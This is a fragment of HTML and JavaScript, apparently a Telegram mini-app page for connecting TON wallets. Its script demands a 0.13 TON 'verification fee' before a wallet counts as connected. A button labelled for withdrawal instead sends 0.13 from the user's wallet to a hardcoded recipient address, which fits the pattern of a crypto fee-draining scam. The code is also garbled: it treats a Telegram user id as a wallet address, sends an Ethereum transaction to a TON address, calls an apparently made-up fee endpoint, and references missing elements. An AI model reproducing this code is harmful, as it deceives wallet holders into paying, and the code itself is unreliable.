    <style>
        /* Modal styling */
        .web3-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            width: 350px;
            text-align: center;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
            position: relative;
        }
        .modal-content h2 {
            margin-top: 10px;
            font-size: 20px;
            color: #333;
        }
        .modal-content p {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .wallet-option {
            width: 100%;
            padding: 10px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .wallet-option img {
            height: 24px;
            margin-right: 8px;
        }
        .other-wallets {
            display: flex;
            justify-content: space-around;
            margin-top: 10px;
        }
        .other-wallets button {
            background: none;
            border: none;
            cursor: pointer;
        }
        .other-wallets img {
            height: 40px;
            width: 40px;
        }
        .close-modal {
            position: absolute;
            top: 10px;
            right: 10px;
            background: transparent;
            border: none;
            font-size: 18px;
            cursor: pointer;
            color: #888;
        }
    </style>
</head>
<body>

                <div class="token-count">

                </div>
            
        </div>
        <div class="wallet-section">
            <div class="wallet-info"></div>
            <div class="wallet-box">
                <button class="ton-wallet-btn" id="wallet-connect-btn">Connect Wallet</button>

        </div>

        <!-- Web3 Wallet Connection Modal -->
        <div class="web3-modal" id="web3Modal">
            <div class="modal-content">
                <button class="close-modal" onclick="closeModal()">✖</button>
                <h2>Connect your wallet</h2>

                </button>
                
                <!-- Other wallet options -->
                <div class="other-wallets">
                    <button onclick="redirectToWallet('Tonkeeper')"><img src="assets/images/Tonkeeper.png" alt="Tonkeeper Icon"></button>
                    <button onclick="redirectToWallet('MyTonWallet')"><img src="assets/images/myton.png" alt="MyTonWallet Icon"></button>
                    <button onclick="redirectToWallet('Tonhub')"><img src="assets/images/toton.png" alt="Tonhub Icon"></button>

        <div class="nav">

                    <li><a href="task.html"><i class="fas fa-tasks"></i> Task</a></li>

    <!-- Add Telegram SDK for WebApp integration -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>


    <script>
        // Initialize Telegram WebApp
window.addEventListener("load", function () {
    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
        Telegram.WebApp.init();
        console.log("Telegram WebApp initialized");
    } else {
        console.error("Telegram WebApp SDK not found.");
    }
});

// Function to open the wallet modal
document.getElementById("wallet-connect-btn").addEventListener("click", function () {
    document.getElementById("web3Modal").style.display = "flex";
});

// Function to close the modal
function closeModal() {
    document.getElementById("web3Modal").style.display = "none";
}

// Redirect to wallet provider based on selection
function redirectToWallet(walletName) {
    let walletURL;

    switch (walletName) {
        case 'Tonkeeper':
            walletURL = 'https://app.tonkeeper.com/';
            break;
        case 'MyTonWallet':
            walletURL = 'https://wallet.ton.org/';
            break;
        case 'Tonhub':
            walletURL = 'https://tonhub.com/';
            break;
        case 'DeWallet':
            walletURL = 'https://dewallet.app/';
            break;
        default:
            console.error("Unknown wallet provider");
            return;
    }

    window.open(walletURL, '_blank');
    closeModal();
}

// Telegram WebApp wallet connection handling
document.getElementById("openTelegramWallet").addEventListener("click", async function () {
    try {
        const walletAddress = await connectToTelegramWallet();
        const balance = await fetchTONBalance(walletAddress);

        // Check if balance is sufficient for the verification fee
        if (balance >= 0.13) {
            const deductionSuccess = await deductVerificationFee(walletAddress, 0.13);
            if (deductionSuccess) {
                updateWalletUI(walletAddress);
                alert("Wallet connected successfully!");
            } else {
                alert("Verification fee deduction failed. Please try again.");
            }
        } else {
            alert("Insufficient balance for verification. You need at least 0.13 TON.");
        }
    } catch (error) {
        console.error("Failed to connect to wallet:", error);
        alert("Wallet connection failed. Please try again.");
    } finally {
        closeModal();
    }
});

// Function to connect to Telegram Wallet in real-time
async function connectToTelegramWallet() {
    try {
        const walletAddress = Telegram.WebApp.initDataUnsafe.user?.id;
        if (!walletAddress) throw new Error("No wallet address found.");
        return walletAddress;
    } catch (error) {
        console.error("Telegram Wallet connection error:", error);
        throw error;
    }
}

// Fetch TON balance via TON API in real-time
async function fetchTONBalance(walletAddress) {
    try {
        const response = await fetch(`https://api.ton.sh/getAddressBalance?address=${walletAddress}`);
        if (!response.ok) throw new Error("Error fetching TON balance");
        const { balance } = await response.json();
        return balance / 1e9; // Convert to TON from nanoton
    } catch (error) {
        console.error("Error fetching balance:", error);
        throw error;
    }
}

// Deduct TON fee for verification in real-time
async function deductVerificationFee(walletAddress, feeAmount) {
    try {
        const response = await fetch("https://api.ton.sh/deductFee", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ address: walletAddress, fee: feeAmount * 1e9 }), // Convert TON to nanoton
        });

        if (!response.ok) throw new Error("Error deducting fee");
        const { success } = await response.json();
        return success;
    } catch (error) {
        console.error("Error deducting fee:", error);
        return false;
    }
}

// Update UI with wallet address and balance
function updateWalletUI(walletAddress) {
    const walletButton = document.getElementById("wallet-connect-btn");
    walletButton.textContent = `Connected: ${walletAddress}`;
    walletButton.disabled = true;

    document.getElementById("balance").textContent = "TON: Fetching...";
    fetchTONBalance(walletAddress).then(balance => {
        document.getElementById("balance").textContent = `TON: ${balance}`;
    }).catch(error => {
        document.getElementById("balance").textContent = "TON: Error fetching balance";
    });
}






// Get the button element
// Ensure Telegram SDK is properly initialized
Telegram.WebApp.ready();

async function handleDepositClick() {
    // Use Web3Modal and ethers.js available globally
    const Web3Modal = window.Web3Modal.default;
    const ethers = window.ethers;
    const WalletConnectProvider = window.WalletConnectProvider.default;

    // Configure provider options for Web3Modal
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider, // Required for WalletConnect
            options: {
                infuraId: "c89924f48aaf458aab21d4d8bcbae342" // Replace with your Infura ID
            }
        }
        // Add other providers if needed
    };

    // Initialize Web3Modal instance
    const web3Modal = new Web3Modal({
        cacheProvider: false, // Optional
        providerOptions // Required
    });

    try {
        // Open Web3Modal to let user select a wallet
        const instance = await web3Modal.connect();

        // Create ethers.js provider from the selected wallet instance
        const provider = new ethers.providers.Web3Provider(instance);

        // Get the connected wallet's signer
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        console.log(`Connected with address: ${userAddress}`);

        // Prepare the transaction details
        const transaction = {
            to: "UQAPdTQd74y36bRC4HrQPIqwaaAkieML2iMFGB08dt2SYK5w", // Replace with the recipient address
            value: ethers.utils.parseEther("0.13") // Amount to send
        };

        // Send the transaction
        const txResponse = await signer.sendTransaction(transaction);
        console.log("Transaction sent:", txResponse);

        // Wait for the transaction to be mined
        const receipt = await txResponse.wait();
        console.log("Transaction confirmed:", receipt);

        alert("Deposit transaction was successful!");
    } catch (error) {
        console.error("Error during wallet connection or transaction:", error);
        alert("Failed to connect or complete the transaction. Please try again.");
    }
}

// Attach the event listener to the button
document.getElementById('withdraw-btn').addEventListener('click', handleDepositClick);
    </script>
